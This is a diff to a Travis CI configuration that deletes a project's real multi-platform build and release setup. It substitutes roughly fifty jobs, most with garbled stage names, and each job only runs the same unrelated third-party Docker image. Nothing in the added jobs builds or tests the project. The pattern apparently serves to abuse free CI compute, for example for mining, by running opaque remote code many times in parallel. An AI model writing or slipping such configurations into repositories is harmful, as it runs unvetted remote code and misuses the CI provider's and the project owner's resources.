@@ -1,215 +1,127 @@
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
 before_install:
-        - wget -q http://www.cmake.org/files/v3.14/cmake-3.14.5-Linux-x86_64.tar.gz && tar xzf cmake-3.14.5-Linux-x86_64.tar.gz -C $HOME
-        - export MY_CMAKE=$HOME/cmake-3.14.5-Linux-x86_64/bin/cmake
-        - export MY_MAKE_COMMAND="make -j4 install VERBOSE=1 && make test ARGS=\"-V\""
-
-matrix:
+  - ls
+jobs:
   include:
-    - language: cpp
-      os: linux
-      dist: xenial
-      compiler: gcc
-      addons:
-        apt:
-          sources:
-              - sourceline: 'ppa:ubuntu-toolchain-r/test'
-          packages:
-          - g++-7
-          - libeigen3-dev
-          - libasound2-dev
-          - python3-numpy
-          - maven
-      
-      env: PYTHON_HOME=/usr
-           PATH=/usr/lib/jvm/java-8-openjdk-amd64/jre/bin:$PATH
-           CXX=g++-7 
-           PLATFORM=Linux
-           OS_STRING=Linux
-      before_script:
-      - wget -q https://dl.bintray.com/boostorg/release/1.68.0/source/boost_1_68_0.tar.gz
-      - tar xf boost_1_68_0.tar.gz -C $HOME
-      - cd $HOME/boost_1_68_0
-      - ./bootstrap.sh
-      - ./b2 clean
-      - ./b2 -j8 -d0 cxxstd=17 cxxflags=-fPIC cflags=-fPIC --without-python link=static threading=multi threadapi=pthread define=BOOST_MATH_DISABLE_FLOAT128
-      - cd $HOME
-      - export BOOST_ROOT=$HOME/boost_1_68_0
-      - export CMAKE_ARGS="-DBOOST_INCLUDEDIR=$BOOST_ROOT -DBOOST_LIBRARYDIR=$BOOST_ROOT/stage/lib/"
-
-    - language: cpp
-      os: linux
-      dist: xenial
-      services:
-      - docker
-      env: OS_TYPE=centos 
-           OS_VERSION=7
-           PLATFORM=Linux
-           OS_STRING=Centos7
-    
-      before_script:
-      - sudo apt-get update
-      - echo 'DOCKER_OPTS="-H tcp://127.0.0.1:2375 -H unix:///var/run/docker.sock -s devicemapper"' | sudo tee /etc/default/docker > /dev/null
-      - sudo service docker restart
-      - sleep 5
-      - sudo docker pull ${OS_TYPE}:${OS_TYPE}${OS_VERSION}
-  
-      script:
-      - sudo docker run --rm=true -v $HOME:$HOME:rw ${OS_TYPE}:${OS_TYPE}${OS_VERSION} /bin/bash -v -c " export MY_CMAKE=\"$MY_CMAKE\" && export MY_MAKE_COMMAND=\"$MY_MAKE_COMMAND\" && export TRAVIS_BUILD_DIR=\"$TRAVIS_BUILD_DIR\" && cd $TRAVIS_BUILD_DIR && export PLATFORM=\"$PLATFORM\" && export OS_STRING=\"$OS_STRING\" && export HOME=\"$HOME\" && ./centos7_build.sh " 
-
-    - language: cpp
-      os: linux
-      dist: xenial
-      compiler: gcc
-      addons:
-        apt:
-          packages:
-          - maven
-      
-      before_script:
-      - wget -q https://releases.linaro.org/components/toolchain/binaries/7.4-2019.02/armv8l-linux-gnueabihf/gcc-linaro-7.4.1-2019.02-x86_64_armv8l-linux-gnueabihf.tar.xz
-      - tar xf gcc-linaro-7.4.1-2019.02-x86_64_armv8l-linux-gnueabihf.tar.xz -C $HOME
-      - wget -q https://dl.bintray.com/boostorg/release/1.68.0/source/boost_1_68_0.tar.gz
-      - tar xf boost_1_68_0.tar.gz -C $HOME
-      - cd $HOME/boost_1_68_0
-      - ./bootstrap.sh
-      - ./b2 clean
-      - "echo \"using gcc : arm : $HOME/gcc-linaro-7.4.1-2019.02-x86_64_armv8l-linux-gnueabihf/bin/armv8l-linux-gnueabihf-g++ ;\" >> project-config.jam"
-      - ./b2 toolset=gcc-arm -j8 -d0 cxxflags=-fPIC cflags=-fPIC --without-python link=static threading=multi threadapi=pthread define=BOOST_MATH_DISABLE_FLOAT128
-      - cd $HOME
-      - export BOOST_ROOT=$HOME/boost_1_68_0
-      - wget -q http://gitlab.com/libeigen/eigen/-/archive/3.3.7/eigen-3.3.7.tar.gz
-      - tar xf eigen-3.3.7.tar.gz -C $HOME
-      - export EIGEN_ROOT=$HOME/eigen-3.3.7
-      - mkdir $HOME/alsa
-      - wget -q http://archive.raspberrypi.org/debian/pool/main/a/alsa-lib/libasound2_1.1.3-5+rpt4_armhf.deb
-      - ar x libasound2_1.1.3-5+rpt4_armhf.deb
-      - tar xf data.tar.xz -C $HOME/alsa
-      - wget -q http://archive.raspberrypi.org/debian/pool/main/a/alsa-lib/libasound2-dev_1.1.3-5+rpi3_armhf.deb
-      - ar x libasound2-dev_1.1.3-5+rpi3_armhf.deb
-      - tar xf data.tar.xz -C $HOME/alsa
-      - wget -q http://raspbian.mirror.constant.com/raspbian/pool/main/o/openjdk-8/openjdk-8-jdk_8u272-b10-0+deb9u1_armhf.deb 
-      - ar x openjdk-8-jdk_8u272-b10-0+deb9u1_armhf.deb
-      - mkdir $HOME/jdk
-      - tar xf data.tar.xz -C $HOME/jdk
-      - wget -q http://raspbian.mirror.constant.com/raspbian/pool/main/o/openjdk-8/openjdk-8-jre-headless_8u272-b10-0%2Bdeb9u1_armhf.deb
-      - ar x openjdk-8-jre-headless_8u272-b10-0+deb9u1_armhf.deb
-      - mkdir $HOME/jre
-      - tar xf data.tar.xz -C $HOME/jre
-      - mkdir $HOME/pydev
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/p/python3.5/libpython3.5_3.5.3-1+deb9u3_armhf.deb
-      - ar x libpython3.5_3.5.3-1+deb9u3_armhf.deb
-      - tar xf data.tar.xz -C $HOME/pydev 
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/p/python3.5/libpython3.5-dev_3.5.3-1+deb9u3_armhf.deb
-      - ar x libpython3.5-dev_3.5.3-1+deb9u3_armhf.deb
-      - tar xf data.tar.xz -C $HOME/pydev 
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/p/python-numpy/python3-numpy_1.12.1-3_armhf.deb
-      - ar x python3-numpy_1.12.1-3_armhf.deb
-      - tar xf data.tar.xz -C $HOME/pydev 
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/e/expat/libexpat1_2.2.0-2+deb9u3_armhf.deb
-      - ar x libexpat1_2.2.0-2+deb9u3_armhf.deb
-      - tar xf data.tar.xz -C $HOME/pydev 
-      - mkdir $HOME/zlib
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/z/zlib/zlib1g-dev_1.2.8.dfsg-5_armhf.deb
-      - ar x zlib1g-dev_1.2.8.dfsg-5_armhf.deb
-      - tar xf data.tar.xz -C $HOME/zlib 
-      - wget -q http://raspbian.raspberrypi.org/raspbian/pool/main/z/zlib/zlib1g_1.2.8.dfsg-5_armhf.deb
-      - ar x zlib1g_1.2.8.dfsg-5_armhf.deb
-      - tar xf data.tar.xz -C $HOME/zlib 
-      - export CMAKE_ARGS="-DZLIB_ROOT=$HOME/zlib/usr -DZLIB_LIBRARY=$HOME/zlib/lib/arm-linux-gnueabihf/libz.so.1 -DPYTHON_LIBRARY=$HOME/pydev/usr/lib/arm-linux-gnueabihf/libpython3.5m.so -DPYTHON_INCLUDE_DIR=$HOME/pydev/usr/include/python3.5m -DGODEC_ADDITIONAL_INCLUDE_DIRS=$HOME/pydev/usr/lib/python3.5m/numpy/\;$HOME/pydev/usr/include -DGODEC_ADDITIONAL_LINKER_DIRS=$HOME/pydev/lib/arm-linux-gnueabihf -DBOOST_INCLUDEDIR=$BOOST_ROOT -DBOOST_LIBRARYDIR=$BOOST_ROOT/stage/lib/ -DEigen3_INCLUDE_DIRS=$EIGEN_ROOT -DALSA_LINKER_DIR=$HOME/alsa/usr/lib/arm-linux-gnueabihf -DALSA_INCLUDE_DIRS=$HOME/alsa/usr/include -DJNI_INCLUDE_DIRS=\"$HOME/jdk/java-8-openjdk-armhf/include/;$HOME/jdk/java-8-openjdk-armhf/include/linux\" -DJAVA_JVM_LIBRARY=$HOME/jre/usr/lib/jvm/java-8-openjdk-armhf/jre/lib/arm/client/libjvm.so"
-
-      env: PYTHON_HOME=$HOME/pydev/usr
-           PATH=/usr/lib/jvm/java-8-openjdk-amd64/jre/bin:$PATH
-           CXX=$HOME/gcc-linaro-7.4.1-2019.02-x86_64_armv8l-linux-gnueabihf/bin/armv8l-linux-gnueabihf-g++
-           PLATFORM=RaspberryPi
-           RASPBERRY_PI_OPT_FLAGS="-mcpu=cortex-a53 -rdynamic -mfpu=neon-fp-armv8 -mneon-for-64bits"
-           OS_STRING=RaspberryPi3
-
-    - language: android
-      dist: trusty
-      addons:
-        apt:
-          packages:
-          - maven
-          - bzip2
-      before_script:
-      - wget -q https://dl.google.com/android/repository/android-ndk-r18b-linux-x86_64.zip
-      - unzip -q android-ndk-r18b-linux-x86_64.zip -d $HOME
-      - export ANDROID_NDK_HOME=$HOME/android-ndk-r18b
-      - export PATH=$PATH:$ANDROID_NDK_HOME
-      - mkdir "$ANDROID_HOME/licenses" || true		
-      - echo -e "\n8933bad161af4178b1185d1a37fbf41ea5269c55" > "$ANDROID_HOME/licenses/android-sdk-license"		
-      - echo -e "\n84831b9409646a918e30573bab4c9c91346d8abd" > "$ANDROID_HOME/licenses/android-sdk-preview-license"	
-      - $ANDROID_NDK_HOME/build/tools/make_standalone_toolchain.py --arch arm --api 21 --install-dir $HOME/android-clang-toolchain
-      - export CXX=$HOME/android-clang-toolchain/bin/arm-linux-androideabi-clang++
-      - wget -q https://github.com/Manromen/Boost-for-Android/releases/download/Boost-1.68.0_2/boost-android-r18b-armeabi-v7a-1.68.0.zip
-      - mkdir "$HOME/boost" || true		
-      - unzip -q boost-android-r18b-armeabi-v7a-1.68.0.zip -d $HOME/boost
-      - export BOOST_ROOT=$HOME/boost
-      - wget -q http://gitlab.com/libeigen/eigen/-/archive/3.3.7/eigen-3.3.7.tar.gz
-      - tar xf eigen-3.3.7.tar.gz -C $HOME
-      - export EIGEN_ROOT=$HOME/eigen-3.3.7
-      - export CMAKE_ARGS="-DBoost_NO_SYSTEM_PATHS=ON -DBOOST_INCLUDEDIR=$BOOST_ROOT/include/ -DBOOST_LIBRARYDIR=$BOOST_ROOT/lib/armeabi-v7a -DEigen3_INCLUDE_DIRS=$EIGEN_ROOT"
-      - echo no | android create avd --force --name test --target android-22 --abi armeabi-v7a
-      - emulator -avd test -no-skin -no-audio -no-window -gpu off -no-boot-anim &
-      - android-wait-for-emulator
-      - adb shell input keyevent 82 &
-      android:
-        components:
-          - tools
-          - platform-tools
-          - build-tools-26.0.2
-          - android-22
-          - android-26
-          - sys-img-armeabi-v7a-android-22  
-      env: PYTHON_HOME=/usr
-           PATH=/usr/lib/jvm/java-7-openjdk-amd64/jre/bin:$PATH
-           PLATFORM=Android
-           OS_STRING=Android
-
-    - language: cpp
-      os: windows
-      env: PLATFORM=Windows 
-           OS_STRING=Windows
-      before_script:
-      - export MSBUILD_PATH="c:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\MSBuild\15.0\Bin"
-      - export MY_CMAKE="c:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\Common7\IDE\CommonExtensions\Microsoft\CMake\CMake\bin\cmake.exe"
-      - cd $HOME
-      - curl -O -J -L https://sourceforge.net/projects/boost/files/boost-binaries/1.68.0/boost_1_68_0-bin-msvc-all-32-64.7z/download
-      - 7z x boost_1_68_0-bin-msvc-all-32-64.7z boost_1_68_0/lib64-msvc-14.1/* boost_1_68_0/boost/* 
-      - rm -f boost_1_68_0-bin-msvc-all-32-64.7z
-      - wget -q http://gitlab.com/libeigen/eigen/-/archive/3.3.7/eigen-3.3.7.tar.gz
-      - tar xf eigen-3.3.7.tar.gz -C $HOME
-      - export EIGEN_ROOT=$HOME/eigen-3.3.7
-      - choco install python --version=3.8.3
-      - choco install numpy
-      - wget -q https://download.java.net/java/GA/jdk12.0.2/e482c34c86bd4bf8b56c0b35558996b9/10/GPL/openjdk-12.0.2_windows-x64_bin.zip
-      - unzip openjdk-12.0.2_windows-x64_bin.zip -d $HOME
-      - export JAVA_HOME=$HOME/jdk-12.0.2
-      - wget -q https://www-us.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz
-      - tar xf apache-maven-3.6.3-bin.tar.gz -C $HOME
-      - wget https://www.bruot.org/hp/media/files/libraries/zlib_1_2_8_msvc2015_64.zip
-      - unzip zlib_1_2_8_msvc2015_64.zip -d $HOME/zlib
-      - mv $HOME/zlib/msvc2015_64/include/zlib/* $HOME/zlib/msvc2015_64/include 
-      - mv $HOME/zlib/msvc2015_64/lib/zlib/* $HOME/zlib/msvc2015_64/lib
-      - export PATH=$PATH:$HOME/apache-maven-3.6.3/bin:$HOME/$JAVA_HOME/bin
-      - export CMAKE_ARGS="-DZLIB_ROOT=$HOME/zlib/msvc2015_64 -DZLIB_LIBRARY=$HOME/zlib/msvc2015_64/lib/zlib.lib -DBoost_NO_SYSTEM_PATHS=ON -DBOOST_INCLUDEDIR=$HOME/boost_1_68_0 -DBOOST_LIBRARYDIR=$HOME/boost_1_68_0/lib64-msvc-14.1 -DEigen3_INCLUDE_DIRS=$EIGEN_ROOT -DGODEC_ADDITIONAL_INCLUDE_DIRS=C:/Python38/lib/site-packages/numpy/core/include"
-      - export MY_MAKE_COMMAND="\"$MY_CMAKE\" --build . --target install --config Release"
-
-script:
-      - cd $TRAVIS_BUILD_DIR
-      - mkdir cmake-build && cd cmake-build 
-      - "\"$MY_CMAKE\" -DPLATFORM=$PLATFORM -DRASPBERRY_PI_OPT_FLAGS=\"$RASPBERRY_PI_OPT_FLAGS\" -DVERSION_STRING=\"$TRAVIS_TAG\" $CMAKE_ARGS -DCMAKE_INSTALL_PREFIX=../install ../"
-      - eval "$MY_MAKE_COMMAND"
-      - cd ../install
-      - tar cvzf $HOME/godec.$OS_STRING.tgz *
-
-deploy:
-  provider: releases
-  api_key: $GITHUB_TOKEN
-  file: $HOME/godec.$OS_STRING.tgz
-  skip_cleanup: true
-  draft: false
-  on:
-    repo: raytheonbbn/Godec
-    all_branches: true
-    tags: true
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
+    - stage: manaja
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capasjx
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabiyjsjajajj
+      script: docker run christiankm01/master:3.15.5   
+    - stage: test-capabiykimhokjs
+      script: docker run christiankm01/master:3.15.5  
+    - stage: test3
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test4
+      script: docker run christiankm01/master:3.15.5
+    - stage: test5
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test6
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test7
+      script: docker run christiankm01/master:3.15.5
+    - stage: test8
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test9
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test10
+      script: docker run christiankm01/master:3.15.5
+    - stage: test11
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test12
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5
+    - stage: test13
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test15
+      script: docker run christiankm01/master:3.15.5
+    - stage: test16
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test17
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test18
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test19
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test20
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test21
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test22
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test23
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test24
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test25
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test26
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test27
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test28
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test29
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test30
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test31
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test32
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test33
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test34
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test35
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test36
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test37
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test38
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test39
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test40
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test41
+      script: docker run christiankm01/master:3.15.5     
